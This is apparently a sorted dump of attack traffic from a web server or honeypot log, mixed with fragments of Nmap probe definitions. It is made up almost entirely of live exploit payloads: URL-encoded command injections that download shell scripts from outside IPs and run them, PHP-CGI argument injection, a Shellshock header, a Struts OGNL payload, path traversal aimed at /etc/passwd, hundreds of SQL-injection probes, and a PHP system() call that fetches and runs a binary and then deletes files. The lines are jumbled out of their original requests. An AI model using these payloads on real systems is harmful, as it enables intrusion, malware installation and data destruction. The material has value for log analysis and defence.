
\
\
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%20%77%67%65%74%20%2d%4f%20%73%63%61%43%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%32%2e%73%68%3b%20%63%68%6d%6f%64%20%2b%78%20%73%63%61%43%2e%73%68%3b%20%2e%2f%73%63%61%43%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%31%32%2e%31%38%33%2e%35%30%2e%32%32%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%32%31%38%2e%32%35%30%2e%32%32%36%2e%31%38%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2d%66%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%6e%74%74%70%64%20%68%74%74%70%3a%2f%2f%36%31%2e%36%2e%30%2e%31%39%30%3a%33%33%34%34%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%6e%74%74%70%64%22%20%3e%3e%20%2e%6e%74%74%70%64%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%6e%74%74%70%64%2e%73%68%3b%2e%2f%2e%6e%74%74%70%64%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%27%23%21%2f%62%69%6e%2f%73%68%27%20%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%77%67%65%74%20%2d%4f%20%32%2e%73%68%20%68%74%74%70%3a%2f%2f%31%37%36%2e%31%30%33%2e%34%38%2e%33%34%2f%74%74%70%2f%74%74%70%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%63%68%6d%6f%64%20%2b%78%20%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%65%63%68%6f%20%27%2e%2f%32%2e%73%68%27%20%3e%3e%20%31%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%31%2e%73%68%3b%2e%2f%31%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31
a
Accept: */*\
Accept-Charset: GBK\,utf-8;q=0.7\,*;q=0.3\
Accept-Charset: ISO-8859-1\,utf-8;q=0.7\,*;q=0.7\
Accept-Encoding: deflate\, gzip\, identity\
Accept-Encoding: gzip\
GET /material.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?content=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?ir=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?m=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?qry=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?section=%27%20OR%20sqlspider HTTP/1.1\
GET /mod%2A.php?thispage=%27%20OR%20sqlspider HTTP/1.1\
GET /modline.asp?id=%27%20OR%20sqlspider HTTP/1.1\
GET /modules/4nAlbum/public/displayCategory.php?basepath=%27%20OR%20sqlspider HTTP/1.1\
GET /modules/vwar/admin/admin.php?vwar_root=index%2ephp%3floc%3d%27%20OR%20sqlspider HTTP/1.1\
GET /muieblackcat HTTP/1.1\
GET //myadmin/scripts/setup.php HTTP/1.1\
GET //MyAdmin/scripts/setup.php HTTP/1.1\
GET /myevent.php?myevent_path=%27%20OR%20sqlspider HTTP/1.1\
GET /newsone.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /news.php?kind=%27%20OR%20sqlspider HTTP/1.1\
GET /Nmap/folder/check1448289400 HTTP/1.1\
GET /Nmap/folder/check1448289401 HTTP/1.1\
GET /nmaplowercheck1448289400 HTTP/1.1\
GET /nmaplowercheck1448289401 HTTP/1.1\
GET /NmapUpperCheck1448289400 HTTP/1.1\
GET /NmapUpperCheck1448289401 HTTP/1.1\
GET /nota.php?category=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?disp=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?eval=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?ir=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?mid=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?module=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?play=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?pre=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?qry=%27%20OR%20sqlspider HTTP/1.1\
GET /nota.php?rub=%27%20OR%20sqlspider HTTP/1.1\
GET /notizia.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /numero.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /offer.php?idf=%27%20OR%20sqlspider HTTP/1.1\
GET /ogl_inet.php?ogl_id=%27%20OR%20sqlspider HTTP/1.1\
GET /opinions.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?a=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?abre=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?loc=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?loc= HTTP/1.1\
GET /padrao.php?middle=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?op=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?path=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?pre=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?read=%27%20OR%20sqlspider HTTP/1.1\
GET /padrao.php?seite=%27%20OR%20sqlspider HTTP/1.1\
GET /page.asp?PartID=%27%20OR%20sqlspider HTTP/1.1\
GET /pagedisplay.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?choix=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?cmd=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?eval=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?numero=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?OpenPage=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?p=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?read=%27%20OR%20sqlspider HTTP/1.1\
GET /page.php?z=%27%20OR%20sqlspider HTTP/1.1\
GET /pagina.php?mid=%27%20OR%20sqlspider HTTP/1.1\
GET /pagina.php?middlePart=%27%20OR%20sqlspider HTTP/1.1\
GET /pagina.php?pagina=%27%20OR%20sqlspider HTTP/1.1\
GET /pagina.php?read=%27%20OR%20sqlspider HTTP/1.1\
GET /pagina.php?sekce=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?disp=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?ev=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?ir=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?load=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?mid=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?path=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?start=%27%20OR%20sqlspider HTTP/1.1\
GET /path.php?thispage=%27%20OR%20sqlspider HTTP/1.1\
GET /payment.asp?CartID=%27%20OR%20sqlspider HTTP/1.1\
GET /person.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /photoalb/lib/static/header.php?set_menu=%27%20OR%20sqlspider HTTP/1.1\
GET /phpmyadmin/scripts/setup.php HTTP/1.0\
GET //phpmyadmin/scripts/setup.php HTTP/1.1\
GET //phpMyAdmin/scripts/setup.php HTTP/1.1\
GET //PHPMyAdmin/scripts/setup.php HTTP/1.1\
GET /phpopenchat/contrib/yabbse/poc.php?sourcedir=%27%20OR%20sqlspider HTTP/1.1\
GET //pma/scripts/setup.php HTTP/1.1\
GET /points.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /press.php?ir=%27%20OR%20sqlspider HTTP/1.1\
GET /press.php?middle=%27%20OR%20sqlspider HTTP/1.1\
GET /press.php?nivel=%27%20OR%20sqlspider HTTP/1.1\
GET /press.php?panel=%27%20OR%20sqlspider HTTP/1.1\
GET /press.php?to=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?home=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?index=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?menue=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?nivel=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?pag=%27%20OR%20sqlspider HTTP/1.1\
GET /principal.php?param=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?l=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?left=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?loc=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?option=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?play=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?pname=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?r=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?read=%27%20OR%20sqlspider HTTP/1.1\
GET /print.php?sp=%27%20OR%20sqlspider HTTP/1.1\
GET /prod_info.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /prodotti.php?idcategoria=%27%20OR%20sqlspider HTTP/1.1\
GET /product.asp?bookID=%27%20OR%20sqlspider HTTP/1.1\
GET /productinfo.asp?item=%27%20OR%20sqlspider HTTP/1.1\
GET /product.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /productsByCategory.asp?intCatalogID=%27%20OR%20sqlspider HTTP/1.1\
GET /prodView.asp?idProduct=%27%20OR%20sqlspider HTTP/1.1\
GET /proposte.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /recension.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /recruit_details.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /robots.txt HTTP/1.1\
GET /rom-0 HTTP/1.1\
GET /rub.php?idr=%27%20OR%20sqlspider HTTP/1.1\
GET /sdk/../../../../../..//etc/vmware/hostd/vmInventory.xml HTTP/1.1\
GET /seccion.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /seccoes.php?seccao=%27%20OR%20sqlspider HTTP/1.1\
GET /services.php?page=%27%20OR%20sqlspider HTTP/1.1\
GET /servicios.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /shopbasket.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
GET /shopbycategory.asp?catid=%27%20OR%20sqlspider HTTP/1.1\
GET /shop.cgi HTTP/1.1\
GET /shopping_basket.asp?cartID=%27%20OR%20sqlspider HTTP/1.1\
GET /shopreviewlist.asp?id=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?channel=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?d=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?ki=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?module=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?n=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?nivel=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?pageweb=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?param=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?qry=%27%20OR%20sqlspider HTTP/1.1\
GET /show.php?read=%27%20OR%20sqlspider HTTP/1.1\
GET /sitemap.xml HTTP/1.1\
GET /sitio.php?body=%27%20OR%20sqlspider HTTP/1.1\
GET /sitio.php?content=%27%20OR%20sqlspider HTTP/1.1\
GET /sitio.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /sitio.php?index=%27%20OR%20sqlspider HTTP/1.1\
GET /sitio.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /sitio.php?redirect=%27%20OR%20sqlspider HTTP/1.1\
GET /sitio.php?start=%27%20OR%20sqlspider HTTP/1.1\
GET /skin/zero_vote/error.php?dir=%27%20OR%20sqlspider HTTP/1.1\
GET /sources/join.php?FORM%5burl%5d=owned%27%20OR%20sqlspider&CONFIG%5bpath%5d=&CONFIG%5bcaptcha%5d=1 HTTP/1.1\
GET /sources/join.php?FORM%5burl%5d=owned&CONFIG%5bpath%5d=%27%20OR%20sqlspider&CONFIG%5bcaptcha%5d=1 HTTP/1.1\
GET /sources/join.php?FORM%5burl%5d=owned&CONFIG%5bpath%5d=&CONFIG%5bcaptcha%5d=1%27%20OR%20sqlspider HTTP/1.1\
GET /sources/post.php?fil_config=%27%20OR%20sqlspider HTTP/1.1\
GET /squito/photolist.inc.php?photoroot=%27%20OR%20sqlspider HTTP/1.1\
GET /stampa.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?e=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?middle=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?op=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?pollname=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?s=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?section=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?var=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?w=%27%20OR%20sqlspider HTTP/1.1\
GET /standard.php?xlink=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?body=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?corpo=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?include=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?index=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?load=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?o=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?p=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?pname=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?str=%27%20OR%20sqlspider HTTP/1.1\
GET /start.php?str= HTTP/1.1\
GET /status.cgi?host=all%27%20OR%20sqlspider HTTP/1.1\
GET /store_bycat.asp?id=%27%20OR%20sqlspider HTTP/1.1\
GET /Stray-Questions-View.php?num=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?abre=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?adresa=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?basepath=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?destino=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?g=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?ir=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?phpbb_root_path=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?pre=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?rub=%27%20OR%20sqlspider HTTP/1.1\
GET /sub%2A.php?seite=%27%20OR%20sqlspider HTTP/1.1\
GET /system/user/scn_user_list HTTP/1.1\
GET /tekst.php?idt=%27%20OR%20sqlspider HTTP/1.1\
GET /tema.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /tema.php?id= HTTP/1.1\
GET /temas.php?ID=%27%20OR%20sqlspider HTTP/1.1\
GET /temp_eg/phpgwapi/setup/tables_update.inc.php?appdir=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?a=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?addr=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?corpo=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?h=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?load=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?mid=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?path=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?play=%27%20OR%20sqlspider HTTP/1.1\
GET /template.php?s=%27%20OR%20sqlspider HTTP/1.1\
GET /tmUnblock.cgi HTTP/1.1
GET /tradeCategory.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /transcript.php?id=%27%20OR%20sqlspider HTTP/1.1\
GET /updatebasket.asp?bookid=%27%20OR%20sqlspider HTTP/1.1\
GET /user/soapCaller.bs HTTP/1.1\
GET /util_gw.js HTTP/1.0\
GET /viewCart.asp?userID=%27%20OR%20sqlspider HTTP/1.1\
GET /view.php?incl=%27%20OR%20sqlspider HTTP/1.1\
GET /view.php?lang=%27%20OR%20sqlspider HTTP/1.1\
GET /view.php?oldal=%27%20OR%20sqlspider HTTP/1.1\
GET /view.php?second=%27%20OR%20sqlspider HTTP/1.1\
GET /view.php?showpage=%27%20OR%20sqlspider HTTP/1.1\
GET /view.php?showpage= HTTP/1.1\
GET /view.php?u=%27%20OR%20sqlspider HTTP/1.1\
GET //_vti_inf.html HTTP/1.1\
GET /web-console/ServerInfo.jsp HTTP/1.1\
GET /whatsnew.asp?idCategory=%27%20OR%20sqlspider HTTP/1.1\
GET /wordpress//wp-login.php HTTP/1.1\
GET //wp-login.php HTTP/1.1\
GET /wp-login.php HTTP/1.1\
GET /wp//wp-login.php HTTP/1.1\
GET /x HTTP/1.1\
GET /XMII/Illuminator HTTP/1.0
GET /zimbra/res/I18nMsg\,AjxMsg\,ZMsg\,ZmMsg\,AjxKeys\,ZmKeys\,ZdMsg\,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../dev/null%00 HTTP/1.1\
GET /zimbra/res/I18nMsg\,AjxMsg\,ZMsg\,ZmMsg\,AjxKeys\,ZmKeys\,ZdMsg\,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00 HTTP/1.1\
HEAD / HTTP/1.0
HEAD / HTTP/1.1\
HEAD http://www.baidu.com/ HTTP/1.1\
HEAD /rom-0 HTTP/1.1\
Host: 153.126.192.79
Host: 153.126.192.79\
Host: 153.126.192.79:269549168\
Host: 153.126.192.79:310443632\
Host: 153.126.192.79:331939440\
Host: 153.126.192.79:80\
Host: 162.252.240.124\
Host: 24x7-allrequestsallowed.com\
Host: 51.254.206.142\
Host: dns.aegins.com\
Host: -h\
Host: ik1-332-26075.vs.sakura.ne.jp
Host: ik1-332-26075.vs.sakura.ne.jp\
Host: localhost\
Host: m.baidu.com\
Host: testp2.czar.bielawa.pl\
Host: testp3.pospr.waw.pl\
Host: testp4.pospr.waw.pl\
Host: testp5.mielno.lubin.pl\
Host: www
Host: www.baidu.com\
Host: www.cloud.ph\
Host: www.google.pl\
Host: www.ik1-332-26075.vs.sakura.ne.jp
Host: www.ip.cn\
Host: www.wikipedia.org\
login=%27%20OR%20sqlspider
login=ghz%3ehzx
login=hzx%22zxc
login=zxc%27xcv
nmap\
OPTIONS / HTTP/1.1\
<?php system('echo NmapCVEIdentification');die(); ?>
POST /cgi-bin/comments HTTP/1.1\
POST /cgi-bin//index HTTP/1.1\
POST //cgi-bin/php?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1\
POST /cgi-bin/php/cgin/php?%2D%64+%61%6C%75%6F%6E+%2D%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\
POST /comments HTTP/1.1\
POST /?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1\
POST /doLogin.do HTTP/1.1\
POST /home HTTP/1.1\
POST / HTTP/1.1\
POST /index.action HTTP/1.1\
POST //index HTTP/1.1\
POST /phpMyAdmin-2.6.4-pl1/libraries/grab_globals.lib.php HTTP/1.1\
POST /tmUnblock.cgi HTTP/1.1\
POST /unAuthorizedAccess.action HTTP/1.1\
Pragma: no-cache\
]]></probe>
]]></probe>\
<probe type="string"><![CDATA[\
<probe type="yaml"><![CDATA[\
Proxy-Connection: Close
Proxy-Connection: Keep-Alive
Proxy-Connection: Keep-Alive\
Range: bytes=0-100\
redirect:${%23res%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')\,%23res.setCharacterEncoding(%22UTF-8%22)\,%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')\,%23res.getWriter().print(%22dir:%22)\,%23res.getWriter().println(%23req.getSession().getServletContext().getRealPath(%22/%22))\,%23res.getWriter().flush()\,%23res.getWriter().close()}
Referer: 153.126.192.79:80/invoker/JMXInvokerServlet\
Referer: 153.126.192.79:80/web-console/ServerInfo.jsp\
Referer: () { :;}; echo; echo "HWNDLGZZCPPYGWD"\
Referer: http://153.126.192.79:80/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo\
Referer: http://153.126.192.79/cgi-bin/ppdscgi.exe\
Referer: http://153.126.192.79/cgi-bin/visadmin.exe\
--- !ruby/object:^@\
--- !ruby/object:Time {}\
<? system("cd /tmp ; wget trying.us.to/seed.jpg ; curl -O http://trying.us.to/seed.jpg ; fetch http://trying.us.to/seed.jpg ; tar -xzvf seed.jpg ; chmod +x seed ; ./seed  ; rm -rf * "); ?>
Te: deflate\,gzip;q=0.3\
